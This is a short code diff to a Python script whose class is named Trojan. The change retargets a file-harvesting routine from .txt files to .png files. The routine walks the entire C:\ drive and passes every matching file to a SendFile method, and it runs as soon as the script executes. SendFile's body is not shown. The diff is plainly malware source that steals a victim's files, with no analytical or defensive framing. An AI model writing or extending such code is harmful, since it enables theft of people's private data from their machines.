@@ -30,9 +30,9 @@ class Trojan:
             else:
                 pass
     
-    def CrawlAllTxt(self):
+    def CrawlAllPng(self):
         counter= 0
-        inp = '.txt'
+        inp = '.png'
         thisdir = os.getcwd()
         for r, d, f in os.walk("C:\\"):
             for file in f:
@@ -42,4 +42,4 @@ class Trojan:
                     self.SendFile(file=os.path.join(r, file))
 
 tj = Trojan()
-tj.CrawlAllTxt()
+tj.CrawlAllPng()
